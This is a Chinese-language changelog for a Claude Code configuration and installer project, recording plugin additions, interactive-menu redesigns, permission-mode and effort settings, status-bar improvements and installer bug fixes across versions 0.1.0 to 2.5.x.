- **询问而非猜测**：md 与 html 的 token 成本差异真实存在，意图不明确时让 skill 把权衡摆给用户，而非静默走默认。
- **用内联 SVG 而非 Mermaid/CDN** 画图：为了完全离线自包含与最大可控性；唯一的网络依赖是可选的 MathJax 公式渲染，且离线时优雅降级为原始 LaTeX。
- **HTML 用相对路径引用 `./images/`**（而非 base64 内嵌）：保持文件精简，并复用 md 路径已经抽取的同一批图。
- **同样的实质、更好的呈现**：HTML 被明确定位为"同一份分析、呈现得让人更快读懂"，绝非更单薄的总结——并由新增的 Common Mistakes 条目守住这一点。

### 注意事项
- HTML 产物随其同级 `images/` 目录一起移动；单独搬走 `.html` 会丢失论文原图（重绘的 SVG 仍可显示）。
- 仓库源文件 `skills/paper-reading/SKILL.md` 与已安装副本 `~/.claude/skills/paper-reading/SKILL.md` 同步更新并校验一致。

## [2.5.2] - 2026-04-21

### 重构
- **将 `env.CLAUDE_CODE_NO_FLICKER` 替换为顶层 `"tui": "fullscreen"`**：`tui` 是官方 schema 为"无闪烁全屏渲染"提供的原生字段。Schema 明确说明 `tui: "fullscreen"` "equivalent to `CLAUDE_CODE_NO_FLICKER=1`"。使用 schema 字段在配置上更规范、可被 JSON Schema 校验，并让 `env` 只保留没有原生字段对应的环境变量。

### 注意事项
- 行为完全一致——同样的全屏渲染器、同样的虚拟滚动缓冲。
- `env` 仍保留 `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS` 和 `CLAUDE_CODE_DISABLE_ADAPTIVE_THINKING`，因为二者目前没有原生 schema 字段对应（`alwaysThinkingEnabled: false` 会完全禁用 thinking，语义不同）。

## [2.5.1] - 2026-04-21

### 错误修复
- **`effortLevel` 默认值由 `max` 改为 `xhigh`**：`max` 不能作为持久默认值——Claude Code 的 `settings.json` 中 `effortLevel` 字段（以及环境变量 `CLAUDE_CODE_EFFORT_LEVEL`）仅接受 `low` / `medium` / `high` / `xhigh`。`max` 档位被官方刻意设计为会话级，只能通过 `/effort max` 每次会话手动开启。此前默认的 `max` 会被静默忽略。
- **移除 `betas: ["extended-cache-ttl-2025-04-11"]`**：1 小时提示缓存 TTL 已正式发布（GA），该 beta header 已不再需要。保留过期的 beta ID 只是无效配置。

### 注意事项
- 如需 `max` 推理强度，请每次会话手动执行 `/effort max`——这是 Anthropic 对最高档位的刻意设计。
- 移除 beta header 后，1h 缓存 TTL 仍原生支持。

## [2.5.0] - 2026-04-21

### 新特性
- **新增插件 `andrej-karpathy-skills`**（marketplace `karpathy-skills`，仓库 `forrestchang/andrej-karpathy-skills`），默认启用。提供 Karpathy 风格的编码行为指引（Think-Before-Coding、Simplicity-First、Surgical Changes、Goal-Driven Execution），用于降低常见 LLM 编码失误。
- **`everything-claude-code` 改为默认关闭**。从 essentials 组移动到新的 optional 组，仅在使用 `--all` 或手动勾选时安装。
- **安装器尊重未选中状态**：运行安装器时，未在菜单中勾选但本地 `settings.json` 已有（或属于我方插件目录）的插件，会在 `enabledPlugins` 中写为 `false`。此前由于 merge 逻辑偏好已有值，未选中的插件可能仍处于启用状态。
- **菜单重新分组**：取消旧的 "Plugins — Official" / "Plugins — Community" / "Skills" 分组，按用途重排。插件与 skill 不再按来源区分，而是按用途并列展示：
  - **Workflow**（8）：andrej-karpathy-skills、superpowers、feature-dev、ralph-loop、commit-commands、code-simplifier、everything-claude-code、`update-config`（skill）
  - **Integrations**（3）：context7、github、playwright
  - **Memory & Lifestyle**（3）：claude-mem、claude-health、PUA
  - **Academic Research**（10）：`paper-reading`（skill）+ 6 个 AI-Research 插件 + 3 个 DeepXiv skill（原 9 项）
  分组标签不再带冗余的 "Plugins —" 前缀。

### 设计理由
- Karpathy 的指引偏通用，适合大多数编码会话，故纳入 essentials。而 everything-claude-code 覆盖面广且风格强烈，改为默认关闭以减少与用户自选标准的冲突。
- 新的 enabledPlugins 规则让交互式菜单具有"最终决定权"：选中即启用，未选中即关闭。本地 `settings.json` 中我方目录之外的键仍然保留，避免误删用户自行添加的插件。

### Bug 修复（复审后）
- **`enabledPlugins` catalogue 现在包含当前选择**。此前菜单里选中但未在 shipped `settings.json` 中声明的插件（`codex@openai-codex`、`health@claude-health`、`pua@pua-skills`）会被 `claude plugin install` 装好但被 filter 丢掉——Claude Code 视其为未启用。现在 catalogue = base keys ∪ `$selected`。
- **Fallback 合并顺序纠正**。未交互插件时的 union 合并改为 existing 值胜出（jq 里 `$base * $over`，PowerShell 里 `$mergeHt $incoming $existing`）。此前运算对象写反，会让 v2.4.x 的用户在"只升级不动插件"时把 `everything-claude-code: true` 静默翻成 `false`。
- **`install_jq` 提到 `install_settings` 顶部**。无 jq 的机器上，fresh install 且保留 statusline+lessons 时不再静默跳过插件 filter。
- **Dry-run 横幅文案与实际语义一致**。此前 `--dry-run` 一律打印 "enabledPlugins: union (new plugins added, existing preserved)"，哪怕真跑时走的是 selection-aware rebuild；现在按 `$INSTALL_PLUGINS` 分支显示。

### Windows 菜单对齐
- install.ps1 现在支持 **→（右方向键）** 打开分组子菜单、**←（左方向键）** 返回主菜单，与 install.sh 对齐。两脚本提示文案同步更新。
- README 列出完整快捷键：主菜单（↑↓ / Enter 或 → / q）、子菜单（↑↓ / Space / ← 或 Esc）、快捷（a / n / d）。

### 注意事项
- 在 `install.sh` 和 `install.ps1` 中新增 `PLUGINS_OPTIONAL` 组，`--all` 模式会同时展开 `PLUGINS_ESSENTIAL + PLUGINS_OPTIONAL`。
- 选择感知的 enabledPlugins 合并仅在安装器处理了插件（`INSTALL_PLUGINS=true`）时生效；若本次只安装 `settings.json` 而未进入插件选择，沿用 fallback union 合并以保留现状。
- 已有用户：之前启用的插件，只有在菜单中再次勾选才会保持启用。建议跑一遍交互式菜单复核。
- README.md 与 README.zh-CN.md 大幅精简（从 349 → 约 195 行）：与 `plugins/README.md` 重复的逐插件细节被合并，同时保留交互菜单对应的完整链接与默认值表格。

## [2.4.0] - 2026-04-21

### 新特性
- **默认权限模式 `auto`**：`settings.json` 默认使用 `permissions.defaultMode = "auto"`，让 Claude 自动批准安全操作、拦截高风险操作。安装器自动检测 Claude Code 版本，低于 2.1.80 时自动降级为 `bypassPermissions`（原有逻辑，保持不变）。
- **最大推理强度**：在 `settings.json` 顶层新增 `effortLevel: "max"`，让 `/effort` 默认固定在最高档。旧版 CLI 不识别 `max` 时会自动回退到 `xhigh` / `high`。
- **1 小时提示缓存 TTL**：`betas: ["extended-cache-ttl-2025-04-11"]` 启用扩展提示缓存（1 小时），替代默认的 5 分钟 TTL，显著降低长会话的缓存 churn。
- **无闪烁渲染**：`env.CLAUDE_CODE_NO_FLICKER = "1"` 切换到全屏渲染模式（等价于 `/tui fullscreen`）。
- **默认关闭 adaptive thinking**：`env.CLAUDE_CODE_DISABLE_ADAPTIVE_THINKING = "1"` 把思考预算固定到 `MAX_THINKING_TOKENS`，不再按轮自适应。Opus 4.7 不受此开关影响（始终自适应）。

### 设计理由
- 把这些"一键开启"的默认集中到一处，简化上手——想要原版行为的用户只需改一行，其余人直接享受高配。
- 未知键（`effortLevel`、`betas`）在旧版 Claude Code 中会被静默忽略，因此无需为它们写版本门控。
- 只有 `auto` 模式真正需要降级，`install.sh` 中已有的 `_supports_auto_mode` 检测足够。

### 注意事项
- `CLAUDE_CODE_DISABLE_ADAPTIVE_THINKING` 和 `CLAUDE_CODE_NO_FLICKER` 需要 Claude Code 2.1.104+。在更早的版本中是无害的空操作。
- Opus 4.7 始终开启 adaptive thinking，不受该开关控制——如需严格固定预算，请切换到其他模型。

## [2.3.1] - 2026-04-12

### 错误修复
- **Windows 远程安装崩溃**：修复 PowerShell 5.x 中通过 `irm URL | iex` 安装时报 `ParameterBindingException` 的问题。内部令牌（如 `"adversarial-review"`）泄漏到 `$args` 并作为位置参数传给 `Invoke-Expression`。现在通过过滤 `$args`，仅传递以 `-` 开头的 switch 参数。

### 设计理由
- `$_safeArgs` 过滤器替代原始 `@args` splatting——本地 `.\install.ps1 -All` 仍然正常工作，同时防止 `irm | iex` 管道模式下的垃圾令牌泄漏。

## [2.3.0] - 2026-04-10

### 新特性
- **自适应状态栏换行**：状态栏根据终端宽度动态换行，而非截断。使用 ANSI 感知的可见宽度计算。
- **自适应进度条缩放**：Context 和 5h usage 进度条在空间不足时自动缩短（最小 8 字符），尽量保持在同一行。
- **智能终端宽度检测**：通过 `/proc/$PID/fd/` 遍历祖先进程文件描述符，在管道环境中找到真实终端宽度。
- **DeepXiv SDK 集成**：新增学术研究分组，内含 `deepxiv_sdk` 插件，支持学术论文搜索与分析。

### 错误修复
- **管道环境 COLUMNS=0**：Claude Code 向状态栏子进程传递空/零 COLUMNS，现已检测并回退到 fd 探测。
- **macOS `wc -L` 兼容**：`visible_len()` 在 `wc -L` 不可用的平台（BSD/macOS）上回退到 `${#stripped}`。
- **负值进度条缩放修复**：前置段超出可用空间时，自适应缩放现在正确 clamp 而非静默使用 20 字符全宽。
- **宽度缓存**：段宽度缓存到并行数组，每次渲染的子 shell fork 从 ~13 次降至 ~7 次。

### 设计理由
- 段数组架构替代字符串拼接，清晰分离布局关注点
- PPID fd 遍历比 `/dev/pts/*` glob 更准确，后者可能读到其他会话的终端
- `visible_len()` 使用 `wc -L`（GNU）处理 emoji/CJK 双宽字符，`${#}` 作为可移植性回退

### 注意事项
- 换行仅在段边界处发生；单个段宽于终端时自然溢出
- 硬编码标签开销估计（18/14 字符）在极端情况下可能偏差 1-2 字符

## [2.2.0] - 2026-04-02

### 新特性
- **二级交互式菜单**：主菜单显示分组摘要（`[已选/总数]`），Enter/→ 进入子菜单，←/Esc 返回。分组：Core、Language Rules、Review、Skills、Plugins — Official/Community/AI Research、MCP Servers。
- **Review 工具选择器**：新增 "Review" 分组——`code-review` 插件（开）、`adversarial-review` skill（开）、Codex CLI（关）。adversarial-review 和 Codex 互斥，自动联动。
- **恢复 adversarial-review skill**：跨模型审查（Claude↔Codex），怀疑者/架构师/极简主义者三重视角，来自 [poteto/noodle](https://github.com/poteto/noodle)。
- **新增 humanizer-zh skill**：来自 [op7418/Humanizer-zh](https://github.com/op7418/Humanizer-zh) 的中文去 AI 痕迹 skill。
- **单插件粒度选择**：23 个插件可单独选择/取消（之前按组捆绑）。
- **CLAUDE.md Code Review 段动态生成**：安装器根据选择的审查工具动态修改 CLAUDE.md 中的 Code Review 规则。
- **方向键导航**：←/→ 支持子菜单进入/退出，与 Enter/Esc 并行。

### Bug 修复（bash 5.x / Linux）
- **根因**：`(( var++ ))` 从 0 自增时返回 exit code 1，bash 5.x `set -e` 下直接杀掉脚本（macOS bash 3.2 不受影响）。全部修复：`(( flat_idx++ ))` → `(( ++flat_idx ))`，`(( fixed++ ))` → `(( ++fixed ))`，`(( cnt++ ))` 加 `|| true`。
- **`[[ ]] && cmd` 缺少 `|| true`**：`_enforce_review_mutex` 和主菜单 ALL 模式中，循环最后一次迭代不匹配时返回 1 导致崩溃。全部加了 `|| true`。
- **`local _menu_active`**：bash 5.x 下 trap handler 无法访问 local 变量，改为全局变量。
- **install.ps1**：删除残留的 `$groups` 覆盖，修复 Windows 交互式菜单崩溃。
- **终端 fd 探测**：检测 `/dev/tty` 断开（EOF）时自动降级为非交互安装。仅拒绝 EOF (ret=1)，不误杀残留输入 (ret=0)。
- **EXIT trap**：`_menu_cleanup` 加入 EXIT trap，异常退出时恢复终端。

### 设计考量
- 二级菜单紧凑且细粒度可控
- 互斥机制防止审查工具冲突
- 所有 `(( ))` 算术和 `[[ ]] && cmd` 模式已系统性加固 `set -e` 防护
- fd 探测提供纵深防御，不产生误报

### 注意事项
- `--all` 安装全部内容，默认使用 adversarial-review（非 Codex）
- 选择 Codex CLI 会自动安装 `codex@openai-codex` 插件
- adversarial-review skill 需要 `codex` CLI 以实现跨模型审查

## [2.1.0] - 2026-04-02

### 新特性
- **Codex adversarial-review 插件**：用官方 [Codex 插件](https://github.com/openai/codex-plugin-cc)（`codex@openai-codex`）替代内置 `adversarial-review` skill。代码审查使用 `/codex:adversarial-review`，Codex 不可用时自动回退到 Claude 的 `code-reviewer` agent。插件已包含在默认安装中。
- **技能重命名**：将 `/update` 恢复为 `/update-config`——目录从 `skills/update/` 重命名为 `skills/update-config/`。安装器升级时自动清理旧的 `skills/update` 和 `skills/adversarial-review` 目录。
- **Smart-merge enabledPlugins 策略变更**：从"existing wins"改为"union"——新插件会自动补充到现有配置中，确保升级用户自动获得 `codex@openai-codex` 等新插件。

### 设计理念
- Codex 插件提供官方维护的对抗式审查实现，共享运行时，集成度更高
- 带命名空间的技能命令（`update-config`）防止在所有仓库中意外覆盖项目级 `/update` 命令
- enabledPlugins 的 union 合并确保升级用户自动获得新插件，同时保留现有配置
- 回退审查路径（`code-reviewer` agent）确保没有 Codex CLI 也能正常审查代码

### 注意事项
- Codex 插件需要通过 `codex login` 认证（运行 `/codex:setup` 检查状态）
- `docs/adversarial-review-showcase.md` 作为历史参考保留
- CHANGELOG 中 `update_config` 和 `adversarial-review` 的历史条目保持原样
- 安装器迁移逻辑自动删除旧的 `skills/update` 和 `skills/adversarial-review` 目录

## [2.0.0] - 2026-03-27

### 新特性
- **Auto 模式默认启用**：`settings.json` 现在默认使用 `defaultMode: "auto"` 替代 `bypassPermissions`。Auto 模式（于 2026-03-24 发布）让 Claude 能自主批准安全操作同时拦截高风险操作——更适合高级用户的安全中间地带。安装器会自动检测 Claude Code 版本，低于 2.1.80 的版本自动降级为 `bypassPermissions`。

### 设计理念
- Auto 模式在执行前对每个工具调用进行风险分类，安全操作自动执行，高风险操作被拦截
- `install.sh` 中的版本检测（`_supports_auto_mode`）确保向后兼容，无需用户干预
- 区分"Claude Code 未安装"和"版本过旧"两种情况，提供不同的警告信息

### 注意事项
- Auto 模式需要 Claude Sonnet 4.6 或 Opus 4.6 模型，Haiku、claude-3 系列及第三方服务商（Bedrock、Vertex、Foundry）不支持
- Auto 模式在 Team 计划中为研究预览版，Enterprise 和 API 支持正在逐步推出
- `sed -i` 回退方案替换为可移植的 `sed > tmp && mv`，兼容 macOS

## [1.9.4] - 2026-03-27

### 新特性
- **paper-reading 技能**：用纯 PDF + pymupdf4llm 自动提取流程替换了不稳定的 ar5iv HTML + Playwright 截图方案。图表、矢量图和表格现在通过 `pymupdf4llm.to_markdown(write_images=True)` 直接从 PDF 提取，并自动过滤和重命名。

### 设计理念
- ar5iv 覆盖率不完整——很多论文没有 HTML 版本，导致截图流程完全失败
- pymupdf4llm 将 `get_images()`、`cluster_drawings()` 和 `get_pixmap(clip=...)` 封装为单次调用，自动处理栅格图和矢量图
- 添加优雅降级：纯理论类论文（无实质图表）只输出纯文字摘要

### 注意事项
- 需要安装 `pymupdf4llm` 包（会自动安装 `pymupdf` 作为依赖）
- OCR 默认关闭（`use_ocr=False`），避免对 tesseract 的依赖
- 模板图片占位符从硬编码的 `figure_X.png` 改为 HTML 注释引导

## [1.9.3] - 2026-03-26

### 新特性
- **PUA 插件**：新增 [tanweai/pua](https://github.com/tanweai/pua) 作为新插件组——AI Agent 生产力倍增器，支持多语言（中/英/日），强制穷举式问题解决和系统化调试

### 设计理念
- PUA 是社区热门插件，显著提升 Agent 的持续性和问题解决深度
- 作为可选组（默认关闭）加入，保持轻量安装，不影响不需要的用户

### 注意事项
- 新增市场 `pua-skills`（共 7 个市场，22 个插件）
- install.sh 和 install.ps1 均已更新，支持新插件组、菜单项、调度和卸载
- README.md 和 README.zh-CN.md 均已更新插件表格

## [1.9.2] - 2026-03-20

### 新特性
- **内置 MesloLGS NF 字体**：将在线下载 JetBrainsMono Nerd Font（GitHub ~30MB zip）替换为内置 4 个 MesloLGS NF .ttf 文件（总计约 10MB）——字体安装即时完成，无网络依赖

### 设计理念
- GitHub Release 下载在网络差的环境中缓慢且不稳定，会阻塞整个安装流程
- MesloLGS NF 是成熟的 Nerd Font（Powerlevel10k 使用），提供状态栏所需的相同 Powerline/图标字形
- 将约 10MB 字体内置到仓库是可接受的权衡，优于安装时需要网络访问

### 注意事项
- 字体文件来自 romkatv/powerlevel10k-media（Apache 2.0 许可）
- install.sh 和 install.ps1 均已更新，不再使用 curl/wget/Invoke-WebRequest 下载字体
- 终端字体提示从 'JetBrainsMono Nerd Font' 改为推荐 'MesloLGS NF'

## [1.9.1] - 2026-03-17

### 新特性
- **paper-reading pymupdf 修复**：修复对抗式代码审查发现的 5 个问题——移除阻塞 PDF 图表提取的 Step 1/Step 3 矛盾描述，添加矢量图检测引导（`get_drawings()`/`get_text("dict")`），修复输出路径一致性，明确 `extract_image` 与基于 clip 渲染方式的区别，添加 pymupdf 可用性预检
- **对抗式审查展示**：添加 adversarial-review 技能展示，4 张截图演示跨模型审查工作流（范围分析 → 审查者召集 → 裁决综合 → 主导判断）

### 设计理念
- Step 1 的"无法截图图表"提示与新的 Path B pymupdf 工作流矛盾——按流程操作的 Agent 会在到达图表提取步骤前就停下来
- 矢量图检测至关重要，因为许多研究论文将折线图、图表和表格编码为矢量/文本对象而非栅格图
- `extract_image(xref)` 返回不带页面级注释的原始嵌入图片——基于 clip 的渲染对大多数图表类型更安全，应作为默认方式

### 注意事项
- Path B PDF 图表提取需要 pymupdf（`pip install pymupdf`）
- 对抗式审查展示截图来自真实审查 session

## [1.9.0] - 2026-03-14

### 新特性
- **claude-health 插件**：在交互式安装器中新增 [claude-health](https://github.com/tw93/claude-health) 作为独立插件组——为 Claude Code 会话提供健康检查和状态面板
- **状态栏 Bug 修复**：修复 context 大小为空时 `fmt_ctx()` 的整数比较错误——`local s=$1` 改为 `local s=${1:-0}`，防止 `[: : integer expression expected` 警告

### 设计理念
- claude-health 作为独立组（类似 claude-mem）而非 Essential 的一部分——它是可选的，用户可能不希望有健康监控开销
- 状态栏修复使用 shell 参数展开默认值（`${1:-0}`），POSIX 兼容，同时处理空值和未设置的变量

### 注意事项
- claude-health 市场来源：`tw93/claude-health`（GitHub）
- 插件总数：6 个市场 21 个（之前是 5 个市场 20 个）

## [1.8.2] - 2026-03-13

### 新特性
- **StatusLine 和 Lessons 现在是独立菜单选项**：原来的"Hooks"项拆分为"StatusLine"（渐变进度条 & 用量显示）和"Lessons"（lessons.md 模板 + SessionStart 自动加载 hook）。用户可以单独安装任一项
- **条件式 settings.json 合并**：`statusLine` 和 `hooks.SessionStart` 字段只在对应菜单项被选中时才合并/包含
- **自动启用 settings.json**：选择 StatusLine 或 Lessons 但尚无 settings.json 时会自动启用（配置所必需）
- **jq 不可用警告**：全新安装时没有 jq 会提示无法从 settings.json 中去除未选中字段

### 设计理念
- 解决 issue #12：不想要状态栏的用户现在可以单独取消选择
- 原"Hooks"项将两个不相关的功能捆绑在一起——状态栏显示和 lessons 自动加载，使用场景不同
- `install_statusline()` 现在只复制 `statusline.sh`（而非 hooks/ 下的所有文件），避免未来的 hook 文件被错误捆绑

### 注意事项
- 已有用户重新运行安装器且取消选择 StatusLine/Lessons 时，现有配置保持不变（安全升级——安装器不会删除之前安装的设置）
- 在没有 jq 的系统上，带有部分选择的全新安装会复制完整的 settings.json 模板并警告包含了额外字段

## [1.8.0] - 2026-03-11

### 新特性
- **`/update_config` 技能**：会话内更新命令——在 Claude Code 中输入 `/update_config`，即可检查新版本并重新运行交互式安装器，无需离开当前会话。对比已安装版本和远程 VERSION，下载最新 `install.sh` 并启动交互式选择器。

### 设计理念
- 基于技能的方案（相比独立脚本）让用户只需一个斜杠命令就能在任意 Claude Code 会话中更新，无需切换终端
- 复用现有的 `install.sh` 远程模式和智能合并——无需维护新的更新逻辑

### 注意事项
- 需要网络访问以获取远程 VERSION 和安装器
- 安装器的智能合并会保留现有 `settings.json` 自定义，且永不覆盖 `lessons.md`

## [1.7.0] - 2026-03-11

### 新特性
- **状态栏显示所有虚拟环境**：状态栏现在可检测 conda（包括 `base`）、Python venv、poetry 和 pipenv 环境。优先级：conda > venv/poetry/pipenv
- **README 文档修复**：交互式菜单示例现在列出 humanizer 技能；状态栏描述现在提及虚拟环境显示
- **字体安装改进**：优先使用 `fc-list` 检测而非文件名 glob（可捕获系统安装的字体）；添加明确的下载超时（连接 10s，总计 120s），防止卡住
- **更新状态栏截图**：替换为当前外观的展示图

### 设计理念
- 显示 conda `base` 是有用的——用户希望确认当前激活的环境，即使是默认环境
- `fc-list` 比文件名 glob 更可靠，因为系统打包的字体可能使用不同的命名规范
- 120s 的下载超时与 Nerd Font zip 大小（约 30MB）在慢速连接下匹配，同时避免无限期挂起

### 注意事项
- 虚拟环境检测依赖环境变量（`CONDA_DEFAULT_ENV`、`VIRTUAL_ENV`）；未设置这些变量的手动激活环境不会被检测到
- conda 和 venv 同时激活时，conda 优先

## [1.6.0] - 2026-03-11

### 新特性
- **jq 自动安装（bash）**：`install.sh` 现在通过包管理器（brew/apt/dnf/yum/pacman/apk）自动安装 jq，或将预构建二进制下载到 `~/.claude/bin/jq`——settings.json 智能合并不再静默跳过
- **状态栏显示 conda 环境**：在目录和 git 分支段之间显示当前激活的 conda 环境名
- **重新安装时跳过市场**：安装器在重试前检查 `~/.claude/plugins/marketplaces/{name}` 是否存在，节省重复安装的约 75 秒
- **Emoji 检测 + 文字回退**：状态栏检测 UTF-8 locale、终端类型和 Nerd Font 可用性——在不支持的终端上回退为文字标签（`M:`、`D:`、`py:`、`br:`）
- **Nerd Font 自动安装**：安装器下载并安装 JetBrainsMono Nerd Font 以支持 Powerline git 分支图标；提示用户设置终端字体

### 设计理念
- jq 安装采用分层方案：先检查 PATH，再检查 `~/.claude/bin/`，然后是包管理器（带 sudo），最后是静态二进制下载（无需 sudo）——覆盖 CI、macOS、Linux 桌面和最小化容器
- conda 显示包括所有环境（含 `base`），增强环境感知
- 市场目录检查是"已注册"的最快可靠指标——避免 `claude plugin marketplace add` 在重复添加时报错导致的 5×3s 重试超时
- 图标回退链：emoji（UTF-8 终端）> Nerd Font（fc-list 检测到）> 文字标签（哑终端/非 UTF-8 终端）——确保状态栏始终可读

### 注意事项
- jq 二进制下载需要 `curl` 或 `wget` 及网络访问；包管理器安装可能需要 `sudo`
- Nerd Font 下载约 30MB；用户安装后需手动设置终端字体
- conda 显示读取 `$CONDA_DEFAULT_ENV`——适用于 conda activate，但不适用于直接操作 `python` 路径

## [1.5.1] - 2026-03-09

### 新特性
- **远程安装现在默认交互式**：一行安装（`curl | bash`、`bash <(curl ...)`）会启动交互式选择器——当 stdin 是管道时从 `/dev/tty` 读取键盘，当 stdin 是 tty 时直接从 stdin 读取
- **`confirm()` 提示也支持管道 stdin**：卸载确认提示现在通过相同设备配对输出和输入（管道时用 `/dev/tty`，正常时用 stdout+stdin）
- **集中式终端检测**：单一 `can_interact()` 函数替代了 `parse_args`、`interactive_menu` 和 `confirm` 中的重复检查

### 设计理念
- `bash <(curl ...)` 已保留终端 stdin；`/dev/tty` 回退专门处理 stdin 携带脚本的 `curl URL | bash` 情况
- 当 fd 0 是 tty 时，交互式菜单优先使用 stdin，只将 `/dev/tty` 作为回退——不会影响缺少 `/dev/tty` 的容器
- 只在 stdin 和 `/dev/tty` 均不可用时（如无头 CI）回退到默认安装（仅 essential 插件）

## [1.5.0] - 2026-03-09

### 新特性
- **Windows 交互式安装器**：`install.ps1` 现在与 bash 版本具有相同的方向键交互菜单，使用 `[Console]::ReadKey()` 进行导航
- **Windows CLI 简化**：PowerShell 参数精简为 `-All`、`-Uninstall`、`-Version`、`-DryRun`、`-Force`（与 bash 对齐）
- **Windows 插件组对齐**：Essential（13 个）+ claude-mem（1 个）+ AI Research（6 个）结构现在与 bash 安装器一致
- **Windows 语言规则清理**：取消选择的语言目录会自动删除，与 bash 行为一致

## [1.4.0] - 2026-03-09

### 新特性
- **交互式安装器**：不带参数运行 `./install.sh` 会启动多选菜单——按数字切换组件，Enter 确认
- **插件组简化**：13 个通用插件合并为一个 Essential 组（默认开启）；claude-mem 单独拆出作为独立切换项（默认关闭）
  - claude-mem（1 个）：独立分出——每 session 注入约 3k tokens（观测索引 + session 摘要）
- **语言规则按需安装**：在交互模式下，Python/TypeScript/Go 规则默认关闭——只安装项目需要的
- **自动清理**：选择特定语言规则时，之前安装的未选中语言目录会自动删除
- **方向键交互菜单**：↑↓ 导航，Enter 切换，Submit 按钮确认
- **CLI 简化**：删除 8 个组件选择标志（`--rules`、`--plugins`、`--mcp`、`--skills`、`--lessons`、`--hooks`、`--claude-md`、`--settings`）；只保留 `--all`、`--uninstall`、`--version`、`--dry-run`、`--force`
- **`--all` 现在安装全部**：包括 MCP 和所有插件组（之前不包括 MCP）

### 设计理念
- 解决 context 累积问题（#7）：默认安装会将约 9k tokens 的规则（包括未使用的语言）+ 大量插件技能列表注入每个 session
- 交互式菜单取代了记忆 CLI 标志的需要——用户一目了然看到所有选项及合理默认值
- CLI 标志删除：组件选择标志与交互式菜单冗余；`--all` 是唯一需要的非交互式安装路径
- claude-mem 单独分出——它是唯一在 SessionStart 时注入约 3k tokens 的插件（观测索引 + session 摘要）；其他 Extended 插件只注册工具/技能名称
- 保留非交互式回退：无 tty 的无头/CI 安装只安装 essential 插件（不含 MCP）；显式 `--all` 安装全部包括 MCP 和所有插件组
- 未知/已删除的 CLI 标志现在报错退出，而非静默降级

### 注意事项
- `--all` 现在安装全部（所有插件、MCP、所有语言规则）
- 远程安装（`bash <(curl ...)`）现在默认显示交互式菜单（v1.5.1+）；添加 `--all` 可非交互式完整安装

## [1.3.0] - 2026-03-09

### 新特性
- 完整卸载现在默认包括插件和 MCP（之前省略）
- 安装警告追踪：合并或插件安装失败时跳过版本戳记并报告警告数
- 卸载前将 `settings.json` 备份为 `settings.json.bak`
- `--all` 标志现在可与其他标志组合（如 `--all --mcp` 安装全部加 MCP）
- Windows 安装器检查 bash 可用性并在缺失时警告（状态栏和 hooks 需要）
- 对抗式审查技能不再需要缺失的 `brain/principles.md`；改用 `reviewer-lenses.md` 作为自包含来源

### Bug 修复
- VERSION 环境变量经过净化，防止远程安装中的命令注入
- 重复安装不再创建嵌套目录（如 `paper-reading/paper-reading/`）
- `stat` 回退顺序修复：优先尝试 Linux `stat -c %Y`，macOS `stat -f %m` 作为回退
- Windows 安装器 AI Research 组中缺少 `tokenization` 插件（5/6 → 6/6）

### 文档
- 自我改进循环措辞说明："auto-saved" → "Claude 根据 CLAUDE.md 指令驱动的纠错写入"
- 卸载示例注释更新为"（含插件和 MCP）"
- 手动插件安装文档更新，包含所有市场 `add` 命令和 `name@marketplace` 语法

### 设计理念
- 警告追踪防止用户误以为部分失败的安装是最新版本
- 卸载时备份 settings 防止意外丢失安装器合并的用户配置
- VERSION 净化关闭了远程安装路径中的真实攻击向量（`bash -c` 接受不可信输入）

### 注意事项
- `bypassPermissions` 默认保持不变（按设计为高级用户配置）
- 对抗式审查仍需要对立 CLI（`codex`/`claude`）——这是设计行为，不是 bug

## [1.2.0] - 2026-03-07

### 新特性
- Windows 支持，带 PowerShell 安装器（`install.ps1`）
- 对抗式代码审查技能（通过对立 AI CLI 进行跨模型审查）
- AI Research 技能组新增 tokenization 插件（huggingface-tokenizers、sentencepiece）
- 跨平台网页搜索日期指令（系统命令 + 回退方案）
- README 导航中新增 Codex 分支链接

### Bug 修复
- 第三方 API 用户的状态栏非阻塞处理
- Bash 3.2 兼容性（用字符串匹配替换关联数组）
- 安装器网络操作重试逻辑（5 次）
- 用量 API 限速时回退到过期缓存

### 设计理念
- PowerShell 安装器镜像 bash 安装器逻辑，实现 Windows 对等
- 对抗式审查替代 codex-cli MCP——跨模型挑战比同模型委派产出更高质量的审查
- 网页搜索日期指令通过优先验证系统时钟确保查询包含当前年份

### 注意事项
- PowerShell 安装器需要 `winget` 安装 `jq`/`gh` 依赖
- 对抗式审查需要安装对立 CLI（Claude 用户需要 `codex`，Codex 用户需要 `claude`）
- 旧仓库名（`claude-code-config`）的 GitHub 重定向仍有效，但规范 URL 现在是 `awesome-claude-code-config`

## [1.1.0] - 2026-03-05

### 新特性
- 渐变状态栏，显示模型、费用和 context 用量
- CLAUDE.md 中的版本变更日志策略
- 项目重命名为 `awesome-claude-code-config`
- 安装器中移除备份逻辑（由智能合并替代）

### 设计理念
- 状态栏提供会话状态的即时感知，不打断工作流
- 变更日志策略确保设计决策与代码同步可追溯

### 注意事项
- 状态栏从 OS 密钥链读取 API 凭证——需要密钥链访问权限
- 重命名可能导致现有书签失效；GitHub 重定向透明处理

## [1.0.0] - 2026-03-02

### 新特性
- 安装器重构：远程安装、智能合并、插件组、卸载、版本管理
- 增强 paper-reading 技能，含深度优先分析和多视角评估
- CLAUDE.md 中的 Code Review 规则
- Codex CLI MCP 服务器集成

### 设计理念
- 插件优先架构：从开源生态安装技能，而非内置捆绑
- 智能合并在升级时保留用户自定义配置
- paper-reading 技能使用 Andrew Ng 的三视角框架进行平衡评估

### 注意事项
- 插件安装器需要 Python 3 和网络访问 GitHub
- MCP 服务器需要单独配置凭证（Lark、GitHub PAT）

## [0.1.0] - 2026-02-25

### 新特性
- 初始版本，包含 CLAUDE.md 全局指令
- 基于 lessons 的自我纠正循环记忆系统
- 插件市场，含 AI 研究、MCP 服务器和 paper-reading 技能
- 飞书/Lark MCP 和 Context7 集成
- 支持插件组的安装器

### 设计理念
- Lessons 驱动的自我改进：记录纠正 → 自动注入 → 稳定模式提升至 CLAUDE.md
- 插件市场分离关注点：CLAUDE.md 管理行为，插件提供领域技能

### 注意事项
- 首个公开版本——API 和配置格式可能变更
